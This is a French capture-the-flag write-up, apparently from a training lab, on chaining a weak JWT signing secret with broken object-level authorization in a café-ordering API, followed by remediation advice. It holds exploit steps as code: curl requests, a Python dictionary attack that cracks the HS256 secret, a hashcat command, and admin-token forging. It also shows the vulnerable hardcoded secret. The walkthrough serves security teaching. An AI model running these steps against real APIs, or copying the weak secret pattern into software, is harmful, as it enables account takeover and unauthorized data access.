# API Café — Forge ton accès (Weak JWT Secret + BOLA)

**Catégorie :** Web - Access Control
**Difficulté :** Avancée
**Points :** 300

## Objectif

Obtenir un accès administrateur sur l'API sans connaître le mot de passe admin, en exploitant une chaîne combinant un secret JWT faible et un contrôle d'autorisation défaillant.

## Vulnérabilités

**1. Secret JWT faible**

L'API signe ses tokens JWT (HS256) avec un secret trivial, présent dans toute wordlist courante :
```python
SECRET = "cafe123"
```

**2. Broken Object Level Authorization (BOLA)**

Le endpoint `/api/orders/<id>` fait confiance au champ `role` du JWT sans jamais le revérifier en base de données :
```python
if payload["user_id"] != owner_id and payload.get("role") != "admin":
    return jsonify({"error": "access denied"}), 403
```

Un attaquant qui peut forger un JWT valide (signature correcte) avec `role: admin` obtient un accès total, peu importe son compte réel.

## Exploitation

**1. Connexion avec un compte faible, récupération du JWT**

```bash
curl -X POST http://<cible>:5004/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"amira","password":"pass123"}'
# {"token": "eyJhbGciOiJIUzI1NiIs..."}
```

**2. Tentative d'accès à une ressource protégée (échoue, comme attendu)**

```bash
curl http://<cible>:5004/api/orders/50 \
  -H "Authorization: Bearer <token_amira>"
# {"error": "access denied"}
```

**3. Cassage du secret de signature hors-ligne**

Le JWT étant signé en HS256 (symétrique), connaître le secret permet de forger n'importe quel token valide. Attaque par dictionnaire :

```python
import jwt
token = "<token_amira>"
for word in open("wordlist.txt"):
    word = word.strip()
    try:
        jwt.decode(token, word, algorithms=["HS256"])
        print(f"[+] Secret trouvé : {word}")
        break
    except jwt.InvalidSignatureError:
        continue
```

Résultat : secret = `cafe123`.

(Alternative : `hashcat -m 16500 jwt.txt wordlist.txt` — mode dédié au cassage de signature JWT HS256.)

**4. Forge d'un token admin**

Une fois le secret connu, on peut signer un nouveau payload arbitraire :
```python
import jwt
forged = jwt.encode({"user_id": 1, "username": "amira", "role": "admin"}, "cafe123", algorithm="HS256")
print(forged)
```

**5. Accès à la ressource protégée avec le token forgé**

```bash
curl http://<cible>:5004/api/orders/50 \
  -H "Authorization: Bearer <token_forge>"
```

## Résultat

```json
{"id": 50, "item": "Commande admin", "details": "FLAG{jwt_w34k_s3cr3t_b0l4_ch41n}"}
```

## Flag

```
FLAG{jwt_w34k_s3cr3t_b0l4_ch41n}
```

## Remédiation

- Secret JWT long, aléatoire et unique par environnement (minimum 256 bits pour HS256), jamais hardcodé dans le code source — à stocker dans un gestionnaire de secrets ou variable d'environnement protégée.
- Ne jamais faire confiance aux claims du JWT pour des décisions d'autorisation sensibles sans revérification côté serveur (le rôle/les permissions devraient être relus depuis la base à chaque requête sensible, ou le JWT invalidé/rafraîchi fréquemment).
- Envisager des algorithmes asymétriques (RS256) pour les architectures où le token doit être vérifié par des services qui n'ont pas besoin de pouvoir en émettre.
- Limiter la durée de vie des tokens et implémenter une révocation possible (liste noire / rotation de clé).
